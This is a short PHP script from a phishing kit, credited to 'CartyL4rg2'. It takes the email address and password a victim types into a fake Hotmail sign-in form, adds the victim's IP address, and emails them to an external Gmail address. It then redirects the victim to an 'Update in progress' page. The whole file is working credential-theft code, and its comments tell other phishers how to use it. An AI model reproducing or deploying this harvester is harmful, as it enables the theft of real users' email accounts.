<?php
/*initializing user details*/
session_start();
$email = $_POST['iSigninName'];
$password = $_POST['pwd'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");

//message going to email dont touch
$message .= "------------Created By CartyL4rg2------------\n";
$message .= "Email ID: ".$_POST['iSigninName']."\n";
$message .= "password: ".$_POST['pwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "------------Created By CartyL4rg2------------\n";

//send script change only ths @yahoo not touch any other thing
$send    = "rajwa.rajwa50@gmail.com";
$subject = "Hotmail LOGINS";
$headers = "From:HotmailL0g<rajwa.rajwa50@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($send,$subject,$message,$headers);
}
header("Location: Update in progress.htm");
?>